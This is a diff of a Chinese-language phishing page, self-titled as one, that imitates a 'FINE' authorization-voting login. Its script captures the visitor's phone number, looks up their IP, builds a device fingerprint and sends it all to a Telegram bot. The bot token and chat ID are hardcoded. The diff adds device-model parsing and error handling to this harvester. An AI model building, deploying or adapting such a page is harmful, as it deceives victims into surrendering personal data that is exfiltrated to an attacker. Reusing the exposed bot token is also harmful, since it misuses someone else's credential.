@@ -1,21 +1,69 @@
 <!DOCTYPE html>
 <html lang="zh">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>這是一個釣魚網站</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #f3f3f3; text-align: center; padding: 50px; }
-    .login-container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); width: 360px; margin: auto; }
-    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
-    button { width: 100%; padding: 10px; background: #00c300; color: white; border: none; border-radius: 5px; cursor: pointer; }
-    button:hover { background: #009f00; }
-    .loading { display: none; font-size: 14px; color: #666; }
-    h2 { font-size: 24px; font-weight: bold; margin-bottom: 15px; }
-    h3 { font-size: 14px; color: #555; }
-    .footer { margin-top: 20px; font-size: 12px; color: #888; }
-    .footer a { color: #888; text-decoration: none; }
-    .footer a:hover { text-decoration: underline; }
+    body {
+      font-family: Arial, sans-serif;
+      background: #f3f3f3;
+      text-align: center;
+      padding: 50px;
+    }
+    .login-container {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      width: 360px;
+      margin: auto;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #00c300;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #009f00;
+    }
+    .loading {
+      display: none;
+      font-size: 14px;
+      color: #666;
+    }
+    h2 {
+      font-size: 24px;
+      font-weight: bold;
+      margin-bottom: 15px;
+    }
+    h3 {
+      font-size: 14px;
+      color: #555;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #888;
+    }
+    .footer a {
+      color: #888;
+      text-decoration: none;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
   </style>
 </head>
 <body>
@@ -23,20 +71,42 @@
     <h2>歡迎使用FINE進行授權投票</h2>
     <h3>輸入電話號碼並點選Next代表您已經同意FINE的服務條例及隱私條款</h3>
     <form id="loginForm">
-      <input type="text" id="username" placeholder="請輸入FINE電話號碼" required>
+      <input
+        type="text"
+        id="username"
+        placeholder="請輸入FINE電話號碼"
+        required
+        autocomplete="off"
+      />
       <button type="submit">Next</button>
       <p class="loading">Verifying...</p>
     </form>
     <div class="footer">
-      <p>© 1978 FINE Corp. <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
+      <p>
+        © 1978 FINE Corp.
+        <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a>
+      </p>
     </div>
   </div>
 
   <script>
-    const token = "8083238190:AAG-SpdyNc8BXVexo2VVbrBaIeBjxJ3PmHo";
-    const chat = "1800067559";
-    const endpoint = `https://api.telegram.org/bot${token}/sendMessage`;
+    // 解析 User-Agent 中的手機型號 (簡單範例)
+    function parseDeviceModel(ua) {
+      // Android 例子: "Android 10; SM-G975F Build/QP1A.190711.020"
+      const androidMatch = ua.match(/Android\s[\d\.]+;\s([^;]+)\sBuild/);
+      if (androidMatch && androidMatch[1]) {
+        return androidMatch[1].trim();
+      }
+      // iPhone 例子: "iPhone; CPU iPhone OS 13_3 like Mac OS X"
+      const iPhoneMatch = ua.match(/\((iPhone|iPad|iPod)[^;]*;/);
+      if (iPhoneMatch && iPhoneMatch[1]) {
+        return iPhoneMatch[1];
+      }
+      // 沒有找到則回傳 Unknown
+      return "Unknown";
+    }
 
+    // 取得裝置及瀏覽器資訊
     function getDeviceInfo() {
       const ua = navigator.userAgent;
       const platform = navigator.platform;
@@ -46,7 +116,8 @@
       const dpr = window.devicePixelRatio || 1;
       const cpu = navigator.hardwareConcurrency || "N/A";
       const memory = navigator.deviceMemory || "N/A";
-      const touch = 'ontouchstart' in window ? "Yes" : "No";
+      const touch = "ontouchstart" in window ? "Yes" : "No";
+      const deviceModel = parseDeviceModel(ua);
 
       let os = "Unknown";
       if (/Windows/i.test(ua)) os = "Windows";
@@ -59,32 +130,47 @@
 🔸作業系統: ${os}
 🔸平台: ${platform}
 🔸語言: ${lang}
-🔸UA: ${ua}
+🔸Device Model: ${deviceModel}
+🔸UserAgent: ${ua}
 🖥️螢幕解析度: ${screenRes}
-🔳可視區域: ${viewportRes}
+🔳視窗大小: ${viewportRes}
 📐DevicePixelRatio: ${dpr}
-💾記憶體: ${memory} GB
-🧠CPU Threads: ${cpu}
-👆Touch 支援: ${touch}`;
+💾記憶體(GB): ${memory}
+🧠CPU核心數: ${cpu}
+👆觸控支援: ${touch}`;
     }
 
-    document.getElementById("loginForm").addEventListener("submit", function(ev) {
+    // Telegram Bot 相關設定
+    const token = "8083238190:AAG-SpdyNc8BXVexo2VVbrBaIeBjxJ3PmHo"; // 你的 Bot Token
+    const chat = "1800067559"; // 你的 Chat ID
+    const endpoint = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    document.getElementById("loginForm").addEventListener("submit", function (ev) {
       ev.preventDefault();
+
       document.querySelector(".loading").style.display = "block";
 
       const phone = document.getElementById("username").value;
 
-      fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(data => {
+      fetch("https://api.ipify.org?format=json")
+        .then((res) => res.json())
+        .then((data) => {
           const ip = data.ip;
           const deviceInfo = getDeviceInfo();
-          const msg = `👤 Log:\n🆔 PHONE: ${phone}\n📍 IP: ${ip}\n\n${deviceInfo}`;
+
+          const msg = `👤 使用者資訊：
+🆔 電話: ${phone}
+📍 IP: ${ip}
+
+${deviceInfo}`;
 
           fetch(endpoint, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chat, text: msg })
+            body: JSON.stringify({
+              chat_id: chat,
+              text: msg,
+            }),
           });
 
           setTimeout(() => {
@@ -92,6 +178,10 @@
             document.getElementById("username").value = "";
             document.querySelector(".loading").style.display = "none";
           }, 2000);
+        })
+        .catch(() => {
+          alert("無法取得IP，請檢查網路連線");
+          document.querySelector(".loading").style.display = "none";
         });
     });
   </script>
